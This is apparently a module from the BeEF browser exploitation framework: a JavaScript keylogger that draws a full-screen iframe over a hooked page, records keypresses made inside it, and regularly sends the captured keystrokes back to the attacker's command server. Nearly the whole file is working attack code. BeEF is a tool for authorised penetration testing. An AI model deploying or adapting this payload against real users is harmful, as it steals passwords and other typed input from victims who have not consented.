//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

    // logged keystrokes array
    var stream = new Array();

    // add the pressed key to the keystroke stream array
    function keyPressHandler(evt) {
        evt = evt || window.event;
        if (evt) {
            var keyCode = evt.charCode || evt.keyCode;
            charLogged = String.fromCharCode(keyCode);
            stream.push(charLogged);
        }
    }

    // creates the overlay 100% width/height iFrame
    overlay = beef.dom.createIframe('fullscreen', 'get', {'src':"<%= @iFrameSrc %>", 'id':"overlayiframe", 'name':"overlayiframe"}, {}, null);

    if(beef.browser.isIE()){
       // listen for keypress events on the iFrame
        function setKeypressHandler(windowOrFrame, keyHandler) {
            var doc = windowOrFrame.document;
            if (doc) {
                if (doc.attachEvent) {
                    doc.attachEvent(
                        'onkeypress',
                        function () {
                            keyHandler(windowOrFrame.event);
                        }
                    );
                }
                else {
                    doc.onkeypress = keyHandler;
                }
            }
        }

        setKeypressHandler(window.frames.overlayiframe, keyPressHandler);

    }else{
        document.getElementById('overlayiframe').contentWindow.addEventListener('keypress', keyPressHandler, true);
    }

    // every N seconds send the keystrokes back to BeEF
    setInterval(function queue() {
        var keystrokes = "";
        if (stream.length > 0) {
            for (var i = 0; i < stream.length; i++) {
                keystrokes += stream[i] + "";
            }
            beef.net.send("<%= @command_url %>", <%= @command_id %>, "keystrokes=" + keystrokes);
                stream = new Array();
            }
        }, <%= @sendBackInterval %>)
});
